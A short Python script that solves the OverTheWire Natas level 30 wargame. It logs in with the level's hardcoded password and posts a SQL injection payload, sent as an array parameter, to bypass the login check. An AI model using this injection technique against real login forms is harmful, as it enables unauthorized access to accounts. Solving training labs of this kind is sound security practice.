import requests
import urllib
import string
import os
import base64

from utils import utils

basic_auth = ('natas30', 'WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH')

url = "http://natas30.natas.labs.overthewire.org/"
headers = {"Content-Type": "application/x-www-form-urlencoded"}

def send_request(session) -> str:
    params = {"username": "natas28", "password": ["'asd' or 1=1--", 4]}
    response = session.post(url,
                    headers=headers,
                    data=params,
                    verify=False)
    return response.text

if __name__ == '__main__':
    session = requests.Session()
    session.auth = basic_auth
    res = send_request(session)
    print(res)